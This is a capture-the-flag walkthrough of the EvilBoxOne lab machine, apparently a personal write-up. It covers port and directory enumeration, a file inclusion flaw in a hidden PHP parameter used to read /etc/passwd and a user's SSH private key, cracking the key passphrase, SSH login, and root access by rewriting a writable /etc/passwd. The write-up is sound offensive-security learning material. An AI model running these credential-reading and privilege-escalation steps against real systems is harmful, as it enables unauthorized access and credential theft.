
sepi0l | 4 January | 2024

## Enumeration: 

### Nmap:

```bash
$IP=192.168.211.212
mkdir nmap
nmap -sC -sV -T3 -vvv -oN nmap/initial $IP
nmap -p- $IP -oN nmap/all_ports
```

### Output: 

```bash
# Nmap 7.94 scan initiated Thu Jan  4 22:33:45 2024 as: nmap -sC -sV -T3 -vvv -oN nmap/initial 192.168.159.212
Nmap scan report for 192.168.211.212
Host is up, received syn-ack (0.20s latency).
Scanned at 2024-01-04 22:33:46 IST for 71s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsg5B3Ae75r4szTNFqG247Ea8vKjxulITlFGE9YEK4KLJA86TskXQn9E24yX4cYMoF0WDn7JD782HfHCrV74r8nU2kVTw5Y8ZRyBEqDwk6vmOzMvq1Kzrcj+i4f17saErC9YVgx5/33e7UkLXt3MYVjVPIekf/sxWxS4b6N0+J1xiISNcoL/kmG3L7McJzX6Qx6cWtauJf3HOxNtZJ94WetHArSpUyIsn83P+Quxa/uaUgGPx4EkHL7Qx3AVIBbKA7uDet/pZUchcPq/4gv25DKJH4XIty+5/yNQo1EMd6Ra5A9SmnhWjSxdFqTGHpdKnyYHr4VeZ7cpvpQnoiV4y9
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJdleEd7RFnYXv0fbc4pC3l/OWWVAe8GNgoY3hK3C5tlUCvQF+LUFKqe5esCmzIkA8pvpNwEqxC8I2E5XjUtIBo=
|   256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqX8NlpHPg67roxI6Xi8VzNZqC5Uj9KHdAnOcD6/q5/
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan  4 22:34:57 2024 -- 1 IP address (1 host up) scanned in 71.80 seconds

```


### Ffuf:

Port 80 has a website running , let's FUZZ for directories using `ffuf`

```bash
ffuf -u http://192.168.211.212/FUZZ -w /opt/wordlists/true.txt -mc all -fc 404
```

### Output:

```bash

secret      [Status: 301, Size: 319, Words: 20, Lines: 10,Duration: 302ms][0m]

```


### Website : 

Looks like, we have a directory called `secret` . Let's check it out .

It returns a blank page, let's fuzz for directories  within `secret`  :

```bash
ffuf -u http://192.168.211.212/secret/FUZZ -w /opt/wordlists/true.txt -mc all -fc 404
```

Nothing came back. Now, let's look for files with specific extensions under the `secret` folder :

```bash
 ffuf -u http://192.168.211.212/secret/FUZZ -w /opt/wordlists/true.txt -mc all -fc 404 -e txt,php,zip,bak
```

Here, i am fuzzing for files with extensions `.php, .bak, . txt, and .zip`

### Output:

```bash

evil.php       [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 219ms][0m]

```

`secret` contains a php file called `evil.php`. However, when we visit it, it returns nothing. Hmm.... What can we do here? Since this is php file, it may contain some `GET` or `POST ` parameters. Let's try to fuzz them using ffuf :

```bash
ffuf -u http://192.168.211.212/secret/evil.php?FUZZ=/etc/passwd -mc all -fs 0
```

## Gaining Access : 

### Output:

```bash

command  [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 218ms][0m

```

We have a hit on the get parameter `command` with the argument `/etc/passwd`. Let's curl it to see the output : 

```bash
curl http://192.168.211.212/secret/evil.php?command=/etc/passwd
```

### Output :

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

```

Looks like we have an LFI here. From the `/etc/passwd` file, we can see two users `root` and `mowree` . Let's check if there are any private ssh keys belonging to that user that we can read.
private keys are generally located in `/home/{username}/.ssh/id_rsa`.

```bash
curl "http://192.168.211.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa"
```

### Output: 

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----

```

Great. We can read the private key. Now we can use this key to login via ssh as `mowree`. But the key is encrypted. Let's decrypt it using `JohnTheRipper`. We can use a module of `JTR` called `ssh2john`. what `ssh2john` does is it converts the private key into a hash which can then be cracked by `JTR` using a dictionary attack. Let's use `ssh2john` to convert the key into a hash and store it in a file :

```python
python3 ssh2john.py id_rsa > hash
```

The hash has been stored in the `hash` directory, we can know crack the hash using `JohnTheRipper` as follows : 

```bash 
john --wordlist=/opt/wordlists/rockyou.txt hash
```

### Output:

```bash
Loading default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (mowree.key)
```

We have cracked the password for the encrypted key file. The password is `unicorn`.
Now, let's login using the key via ssh as `mowree`

```bash
ssh -i id_rsa mowree@192.168.211.212 
Enter passphrase for key 'id_rsa': unicorn
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$
```

And We are in!!!!. We have gained initial access via ssh as `mowree`.

## Privilege Escalation : 

Now, we have to gain root access on the box. Let's start by finding interesting `SUID` binaries :

```bash
find / -type f -perm -4000 2>/dev/null
```
### Output: 

```bash
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/fusermount
```

Nothing seems out of place here. Let's check what commands we can run as sudo :

```bash
sudo -l
```

### Output:

```bash
-bash: sudo: orden no encontrada
```

Looks like we have an error here. Let's translate the output 

```text
order not found
```

Looks like sudo is not available on the system. Let's run `linpeas` and check if we can find any vectors for privesc.

Looks like we can write into the `/etc/passwd` file : 

![[Pasted image 20240105011108.png]]

We can create a hash of our own and write it into the `/etc/passwd` file , overwriting the `hash` of the root user. Since, this is a linux system, it is using `sha512crypt` algorithm to hash the user passwords. Let's. create a password hash of our own using openssl : 

```bash
openssl passwd -6 hello123
```

### Output : 
```bash
$6$uegv3O1quNfDQoch$cYsfUhfmB7uxfWXGRlG06lppM.PTE97MNIQ6T6c1vikpBpXCYFi.1xQ9DGLERjvRUJCIvLO/WXVT74kX0lNWH1
```

Now, we can write this hash into the `/etc/passwd` file , essentially overwriting the password for the root user :

```bash
nano /etc/passwd
```

```bash
root:$6$uegv3O1quNfDQoch$cYsfUhfmB7uxfWXGRlG06lppM.PTE97MNIQ6T6c1vikpBpXCYFi.1xQ9DGLERjvRUJCIvLO/WXVT74kX0lNWH1:0:0:root:/root:/bin/bash
```

We replace the first line with the line above and save the file.

Now we can login as the root user using the password `hello123`

```bash
su root
password: hello123
root@EvilBoxOne:/tmp#
```

![[Pasted image 20240105012205.png]]

We have owned the box. Thanks for reading.
See you in the next one :)

Regards,
sepi0l.